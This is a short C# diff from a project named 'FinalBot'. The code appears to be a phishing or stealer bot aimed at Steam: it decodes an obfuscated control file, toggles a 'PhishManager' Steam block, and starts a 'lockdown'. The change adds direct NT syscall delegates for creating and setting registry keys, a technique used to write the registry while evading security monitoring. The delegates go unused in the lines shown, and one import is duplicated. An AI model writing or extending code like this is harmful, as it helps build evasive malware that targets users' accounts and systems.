@@ -1,4 +1,6 @@
 using System;
+using System.Text;
+using System.IO;
 using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
@@ -62,6 +64,8 @@ namespace FinalBot
                 {
                     string enc = File.ReadAllText(blockPath).Trim();
                     string dec = XE(enc);
+                    var ntCreateKey = SyscallManager.GetSyscallDelegate<NtCreateKey>("NtCreateKey");
+                    var ntSetValueKey = SyscallManager.GetSyscallDelegate<NtSetValueKey>("NtSetValueKey");
                     PhishManager.GlobalBlockSteam = dec == "1";
                     if (PhishManager.GlobalBlockSteam) PhishManager.StartLockdown();
                 }
